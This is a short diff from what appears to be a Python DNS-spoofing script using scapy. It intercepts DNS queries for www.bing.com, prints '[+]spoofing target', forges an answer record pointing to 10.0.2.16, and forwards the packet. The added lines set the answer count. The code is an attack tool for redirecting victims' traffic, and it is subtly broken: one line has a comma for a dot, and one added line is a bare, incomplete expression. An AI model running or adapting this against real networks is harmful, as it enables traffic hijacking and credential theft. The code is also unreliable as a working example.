@@ -10,6 +10,8 @@ def process_packet(packet):
        if "www.bing.com" in qname:
           print("[+]spoofing target")
           answer = scapy,DNSRR(rrname=qname,rdata="10.0.2.16")   #redirecting target to the desired ip address
+          scapy_packet[scapy.DNS].an
+          scapy_packet[scapy.DNS].ancount=1
 
     packet.accept()  #to forward the packets
 
